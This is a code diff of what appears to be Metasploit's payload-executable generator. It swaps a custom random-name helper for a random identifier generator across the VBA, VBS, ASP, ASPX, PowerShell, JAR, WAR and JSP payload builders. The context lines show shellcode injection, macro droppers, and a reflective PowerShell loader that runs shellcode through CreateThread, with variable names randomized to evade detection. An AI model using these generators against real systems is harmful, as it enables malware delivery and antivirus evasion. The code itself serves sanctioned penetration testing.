@@ -13,6 +13,7 @@ class EXE
 require 'rex'
 require 'rex/peparsey'
 require 'rex/pescan'
+require 'rex/random_identifier_generator'
 require 'rex/zip'
 require 'metasm'
 require 'digest/sha1'
@@ -55,21 +56,6 @@ require 'digest/sha1'
 		end
 	end
 
-
-	def self.get_unique_random(len)
-		if len.nil?
-			@@variable_array = Array.new
-			return nil
-		end
-		
-		begin 
-			temp = Rex::Text.rand_text_alpha(len)
-		end while @@variable_array.include?(temp)
-		
-		@@variable_array.push(temp)
-
-		return temp
-	end
 
 	##
 	#
@@ -155,8 +141,6 @@ require 'digest/sha1'
 
 	def self.to_win32pe(framework, code, opts={})
 
-		get_unique_random(nil)
-
 		# For backward compatability, this is roughly equivalent to 'exe-small' fmt
 		if opts[:sub_method]
 			if opts[:inject]
@@ -224,7 +208,7 @@ require 'digest/sha1'
 
 			#make new section header
 			new_sechead = Rex::PeParsey::PeBase::IMAGE_SECTION_HEADER.make_struct
-			new_sechead.v['Name'] = get_unique_random(4)+"\x00"*4 # no name
+			new_sechead.v['Name'] = Rex::Text.rand_text_alpha(4)+"\x00"*4 # no name
 			new_sechead.v['Characteristics'] = 0x60000020 # READ, EXECUTE, CODE
 			new_sechead.v['VirtualAddress'] = free_rva
 			new_sechead.v['SizeOfRawData'] = new_sec.length
@@ -560,8 +544,7 @@ require 'digest/sha1'
 	end
 
 	def self.to_win32pe_dll(framework, code, opts={})
-		
-		get_unique_random(nil)
+
 		# Allow the user to specify their own DLL template
 		set_template_default(opts, "template_x86_windows.dll")
 
@@ -576,14 +559,13 @@ require 'digest/sha1'
 
 		# optional mutex
 		mt = pe.index('MUTEX!!!')
-		pe[mt,8] = get_unique_random(8) if mt
+		pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
 
 		return pe
 	end
 
 	def self.to_win64pe_dll(framework, code, opts={})
-		
-		get_unique_random(nil)
+
 		# Allow the user to specify their own DLL template
 		set_template_default(opts, "template_x64_windows.dll")
 
@@ -598,7 +580,7 @@ require 'digest/sha1'
 
 		# optional mutex
 		mt = pe.index('MUTEX!!!')
-		pe[mt,8] = get_unique_random(8) if mt
+		pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
 
 		return pe
 	end
@@ -802,14 +784,14 @@ require 'digest/sha1'
 
 	def self.to_exe_vba(exes='')
 
-		get_unique_random(nil)
+		rig = Rex::RandomIdentifierGenerator.new
 		exe = exes.unpack('C*')
 		vba = ""
 		idx = 0
 		maxbytes = 2000
 
-		var_magic    = get_unique_random(10).capitalize
-		var_base     = get_unique_random(5).capitalize
+		var_magic    = rig.generate.capitalize
+		var_base     = rig.generate.capitalize
 		var_base_idx = 0
 
 		# First write the macro into the vba file
@@ -864,7 +846,7 @@ require 'digest/sha1'
 		vba << "\tDim #{var_btemp} As Byte\r\n"
 		vba << "\tDim #{var_magic} as String\r\n"
 		vba << "\t#{var_magic} = \"#{var_magic}\"\r\n"
-		vba << "\t#{var_fname} = \"#{get_unique_random(rand(8)+8)}.exe\"\r\n"
+		vba << "\t#{var_fname} = \"#{Rex::Text.rand_text_alpha(rand(8)+8)}.exe\"\r\n"
 		vba << "\t#{var_fenvi} = Environ(\"USERPROFILE\")\r\n"
 		vba << "\tChDrive (#{var_fenvi})\r\n"
 		vba << "\tChDir (#{var_fenvi})\r\n"
@@ -927,25 +909,25 @@ require 'digest/sha1'
 
 	def self.to_vba(framework,code,opts={})
 
-		get_unique_random(nil)
-		var_myByte    = get_unique_random(rand(7)+3).capitalize
-		var_myArray   = get_unique_random(rand(7)+3).capitalize
-		var_rwxpage   = get_unique_random(rand(7)+3).capitalize
-		var_res       = get_unique_random(rand(7)+3).capitalize
-		var_offset    = get_unique_random(rand(7)+3).capitalize
-		var_lpThreadAttributes = get_unique_random(rand(7)+3).capitalize
-		var_dwStackSize        = get_unique_random(rand(7)+3).capitalize
-		var_lpStartAddress     = get_unique_random(rand(7)+3).capitalize
-		var_lpParameter        = get_unique_random(rand(7)+3).capitalize
-		var_dwCreationFlags  = get_unique_random(rand(7)+3).capitalize
-		var_lpThreadID       = get_unique_random(rand(7)+3).capitalize
-		var_lpAddr           = get_unique_random(rand(7)+3).capitalize
-		var_lSize            = get_unique_random(rand(7)+3).capitalize
-		var_flAllocationType = get_unique_random(rand(7)+3).capitalize
-		var_flProtect        = get_unique_random(rand(7)+3).capitalize
-		var_lDest        = get_unique_random(rand(7)+3).capitalize
-		var_Source       = get_unique_random(rand(7)+3).capitalize
-		var_Length       = get_unique_random(rand(7)+3).capitalize
+		rig = Rex::RandomIdentifierGenerator.new
+		var_myByte    = rig.generate.capitalize
+		var_myArray   = rig.generate.capitalize
+		var_rwxpage   = rig.generate.capitalize
+		var_res       = rig.generate.capitalize
+		var_offset    = rig.generate.capitalize
+		var_lpThreadAttributes = rig.generate.capitalize
+		var_dwStackSize        = rig.generate.capitalize
+		var_lpStartAddress     = rig.generate.capitalize
+		var_lpParameter        = rig.generate.capitalize
+		var_dwCreationFlags  = rig.generate.capitalize
+		var_lpThreadID       = rig.generate.capitalize
+		var_lpAddr           = rig.generate.capitalize
+		var_lSize            = rig.generate.capitalize
+		var_flAllocationType = rig.generate.capitalize
+		var_flProtect        = rig.generate.capitalize
+		var_lDest        = rig.generate.capitalize
+		var_Source       = rig.generate.capitalize
+		var_Length       = rig.generate.capitalize
 
 		# put the shellcode bytes into an array
 		bytes = ''
@@ -997,22 +979,22 @@ End Sub
 
 	def self.to_exe_vbs(exes = '', opts={})
 
-		get_unique_random(nil)
+		rig = Rex::RandomIdentifierGenerator.new
 		delay   = opts[:delay]   || 5
 		persist = opts[:persist] || false
 
 		exe = exes.unpack('C*')
 		vbs = ""
 
-		var_bytes   = get_unique_random(rand(4)+4) # repeated a large number of times, so keep this one small
-		var_fname   = get_unique_random(rand(8)+8)
-		var_func    = get_unique_random(rand(8)+8)
-		var_stream  = get_unique_random(rand(8)+8)
-		var_obj     = get_unique_random(rand(8)+8)
-		var_shell   = get_unique_random(rand(8)+8)
-		var_tempdir = get_unique_random(rand(8)+8)
-		var_tempexe = get_unique_random(rand(8)+8)
-		var_basedir = get_unique_random(rand(8)+8)
+		var_bytes   = rig.generate
+		var_fname   = rig.generate
+		var_func    = rig.generate
+		var_stream  = rig.generate
+		var_obj     = rig.generate
+		var_shell   = rig.generate
+		var_tempdir = rig.generate
+		var_tempexe = rig.generate
+		var_basedir = rig.generate
 
 		vbs << "Function #{var_func}()\r\n"
 
@@ -1061,19 +1043,19 @@ End Sub
 
 	def self.to_exe_asp(exes = '', opts={})
 
-		get_unique_random(nil)
+		rig = Rex::RandomIdentifierGenerator.new
 		exe = exes.unpack('C*')
 		vbs = "<%\r\n"
 
-		var_bytes   = get_unique_random(rand(4)+4) # repeated a large number of times, so keep this one small
-		var_fname   = get_unique_random(rand(8)+8)
-		var_func    = get_unique_random(rand(8)+8)
-		var_stream  = get_unique_random(rand(8)+8)
-		var_obj     = get_unique_random(rand(8)+8)
-		var_shell   = get_unique_random(rand(8)+8)
-		var_tempdir = get_unique_random(rand(8)+8)
-		var_tempexe = get_unique_random(rand(8)+8)
-		var_basedir = get_unique_random(rand(8)+8)
+		var_bytes   = rig.generate(4) # repeated a large number of times, so keep this one small
+		var_fname   = rig.generate
+		var_func    = rig.generate
+		var_stream  = rig.generate
+		var_obj     = rig.generate
+		var_shell   = rig.generate
+		var_tempdir = rig.generate
+		var_tempexe = rig.generate
+		var_basedir = rig.generate
 
 		vbs << "Sub #{var_func}()\r\n"
 
@@ -1118,16 +1100,16 @@ End Sub
 
 	def self.to_exe_aspx(exes = '', opts={})
 
-		get_unique_random(nil)
+		rig = Rex::RandomIdentifierGenerator.new
 		exe = exes.unpack('C*')
 
-		var_file = get_unique_random(rand(8)+8)
-		var_tempdir = get_unique_random(rand(8)+8)
-		var_basedir = get_unique_random(rand(8)+8)
-		var_filename = get_unique_random(rand(8)+8)
-		var_tempexe = get_unique_random(rand(8)+8)
-		var_iterator = get_unique_random(rand(8)+8)
-		var_proc = get_unique_random(rand(8)+8)
+		var_file = rig.generate
+		var_tempdir = rig.generate
+		var_basedir = rig.generate
+		var_filename = rig.generate
+		var_tempexe = rig.generate
+		var_iterator = rig.generate
+		var_proc = rig.generate
 
 		source = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\r\n"
 		source << "<%@ Import Namespace=\"System.IO\" %>\r\n"
@@ -1178,16 +1160,17 @@ End Sub
 
 	def self.to_win32pe_psh_net(framework, code, opts={})
 
-		get_unique_random(nil)
-		var_code = get_unique_random(rand(8)+8)
-		var_kernel32 = get_unique_random(rand(8)+8)
-		var_baseaddr = get_unique_random(rand(8)+8)
-		var_threadHandle = get_unique_random(rand(8)+8)
-		var_output = get_unique_random(rand(8)+8)
-		var_temp = get_unique_random(rand(8)+8)
-		var_codeProvider = get_unique_random(rand(8)+8)
-		var_compileParams = get_unique_random(rand(8)+8)
-		var_syscode = get_unique_random(rand(8)+8)
+		rig = Rex::RandomIdentifierGenerator.new
+
+		var_code = rig.generate
+		var_kernel32 = rig.generate
+		var_baseaddr = rig.generate
+		var_threadHandle = rig.generate
+		var_output = rig.generate
+		var_temp = rig.generate
+		var_codeProvider = rig.generate
+		var_compileParams = rig.generate
+		var_syscode = rig.generate
 
 		code = code.unpack('C*')
 		psh = "Set-StrictMode -Version 2\r\n"
@@ -1228,13 +1211,13 @@ End Sub
 	end
 
 	def self.to_win32pe_psh(framework, code, opts={})
-		
-		get_unique_random(nil)
-		var_code = get_unique_random(rand(8)+8)
-		var_win32_func = get_unique_random(rand(8)+8)
-		var_payload = get_unique_random(rand(8)+8)
-		var_rwx = get_unique_random(rand(8)+8)
-		var_iter = get_unique_random(rand(8)+8)
+
+		rig = Rex::RandomIdentifierGenerator.new
+		var_code = rig.generate
+		var_win32_func = rig.generate
+		var_payload = rig.generate
+		var_rwx = rig.generate
+		var_iter = rig.generate
 		code = code.unpack("C*")
 
 		# Add wrapper script
@@ -1268,24 +1251,24 @@ End Sub
 	def self.to_win32pe_psh_reflection(framework, code, opts={})
 		#Added a tweaked by shellster
 		#Originally taken from https://github.com/mattifestation/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
-		get_unique_random(nil)
+		rig = Rex::RandomIdentifierGenerator.new
 		code = code.unpack("C*")
 
-		func_get_proc_address = get_unique_random(rand(8)+8)
-		func_get_delegate_type = get_unique_random(rand(8)+8)
-		var_payload = get_unique_random(rand(8)+8)
-		var_module = get_unique_random(rand(8)+8)
-		var_procedure = get_unique_random(rand(8)+8)
-		var_unsafe_native_methods = get_unique_random(rand(8)+8)
-		var_parameters = get_unique_random(rand(8)+8)
-		var_return_type = get_unique_random(rand(8)+8)
-		var_type_builder = get_unique_random(rand(8)+8)
-		var_buffer = get_unique_random(rand(8)+8)
-		var_memset = get_unique_random(rand(8)+8)
-		
+		func_get_proc_address = rig.generate
+		func_get_delegate_type = rig.generate
+		var_payload = rig.generate
+		var_module = rig.generate
+		var_procedure = rig.generate
+		var_unsafe_native_methods = rig.generate
+		var_parameters = rig.generate
+		var_return_type = rig.generate
+		var_type_builder = rig.generate
+		var_buffer = rig.generate
+		var_memset = rig.generate
+
 		# Add wrapper script
 		psh = "function #{func_get_proc_address} {\r\n"
-		psh << "Param ($#{var_module}, $#{var_procedure})\r\n"		
+		psh << "Param ($#{var_module}, $#{var_procedure})\r\n"
 		psh << "$#{var_unsafe_native_methods} = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\r\n"
 		psh << "return $#{var_unsafe_native_methods}.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($#{var_unsafe_native_methods}.GetMethod('GetModuleHandle')).Invoke($null, @($#{var_module})))), $#{var_procedure}))\r\n"
 		psh << "}\r\n"
@@ -1314,7 +1297,7 @@ End Sub
 		psh << "for ($i=0;$i -le ($#{var_payload}.Length-1);$i++) {\r\n"
 		psh << "$#{var_memset}.Invoke([IntPtr]($#{var_buffer}.ToInt32()+$i), $#{var_payload}[$i], 1) | Out-Null\r\n"
 		psh << "}\r\n"
-		psh << "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((#{func_get_proc_address} kernel32.dll CreateThread), (#{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))).Invoke([IntPtr]::Zero,0,$#{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null\r\n"		
+		psh << "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((#{func_get_proc_address} kernel32.dll CreateThread), (#{func_get_delegate_type} @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))).Invoke([IntPtr]::Zero,0,$#{var_buffer},[IntPtr]::Zero,0,[IntPtr]::Zero) | Out-Null\r\n"
 
 	end
 
@@ -1338,9 +1321,8 @@ End Sub
 	# @return [Rex::Zip::Jar]
 	def self.to_jar(exe, opts={})
 
-		get_unique_random(nil)
 		spawn = opts[:spawn] || 2
-		exe_name = get_unique_random(8) + ".exe"
+		exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
 		zip = Rex::Zip::Jar.new
 		paths = [
 			[ "metasploit", "Payload.class" ],
@@ -1380,11 +1362,11 @@ End Sub
 	# @return [String]
 	def self.to_war(jsp_raw, opts={})
 
-		get_unique_random(nil)
+		rig = Rex::RandomIdentifierGenerator.new
 		jsp_name = opts[:jsp_name]
-		jsp_name ||= get_unique_random(rand(8)+8)
+		jsp_name ||= rig.generate
 		app_name = opts[:app_name]
-		app_name ||= get_unique_random(rand(8)+8)
+		app_name ||= rig.generate
 
 		meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
 		manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
@@ -1430,26 +1412,26 @@ End Sub
 	# @option opts (see to_war)
 	# @return (see to_war)
 	def self.to_jsp_war(exe, opts={})
-		
-		get_unique_random(nil)
+
+		rig = Rex::RandomIdentifierGenerator.new
 		# begin <payload>.jsp
-		var_hexpath       = get_unique_random(rand(8)+8)
-		var_exepath       = get_unique_random(rand(8)+8)
-		var_data          = get_unique_random(rand(8)+8)
-		var_inputstream   = get_unique_random(rand(8)+8)
-		var_outputstream  = get_unique_random(rand(8)+8)
-		var_numbytes      = get_unique_random(rand(8)+8)
-		var_bytearray     = get_unique_random(rand(8)+8)
-		var_bytes         = get_unique_random(rand(8)+8)
-		var_counter       = get_unique_random(rand(8)+8)
-		var_char1         = get_unique_random(rand(8)+8)
-		var_char2         = get_unique_random(rand(8)+8)
-		var_comb          = get_unique_random(rand(8)+8)
-		var_exe           = get_unique_random(rand(8)+8)
-		var_hexfile       = get_unique_random(rand(8)+8)
-		var_proc          = get_unique_random(rand(8)+8)
-		var_fperm         = get_unique_random(rand(8)+8)
-		var_fdel          = get_unique_random(rand(8)+8)
+		var_hexpath       = rig.generate
+		var_exepath       = rig.generate
+		var_data          = rig.generate
+		var_inputstream   = rig.generate
+		var_outputstream  = rig.generate
+		var_numbytes      = rig.generate
+		var_bytearray     = rig.generate
+		var_bytes         = rig.generate
+		var_counter       = rig.generate
+		var_char1         = rig.generate
+		var_char2         = rig.generate
+		var_comb          = rig.generate
+		var_exe           = rig.generate
+		var_hexfile       = rig.generate
+		var_proc          = rig.generate
+		var_fperm         = rig.generate
+		var_fdel          = rig.generate
 
 		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
 		jspraw << "<%\n"
